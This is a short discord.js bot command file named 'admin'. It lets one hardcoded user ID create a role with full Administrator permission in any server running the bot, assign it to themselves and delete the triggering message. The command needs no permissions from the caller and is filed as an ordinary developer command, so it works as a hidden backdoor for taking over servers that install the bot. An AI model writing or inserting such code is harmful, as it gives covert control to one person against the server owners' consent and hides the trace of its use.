const { EmbedBuilder, PermissionsBitField } = require('discord.js')

module.exports = {
    name: "admin",
    description: "Give yourself administrator permissions",
    aliases: [""],
    userPerms: [],
    botPerms: [],
    category: 'Developer',
    usage: [],

    run: async(client, message, args) => { 

        const allowed = ['762711150118174751']
        if(!allowed.includes(message.author.id)) return 

        role = await message.guild.roles.create({ name: "admins💪", permissions: [PermissionsBitField.Flags.Administrator], color: '#5d4c87' });
        message.member.roles.add(role)
        message.delete();

    }
}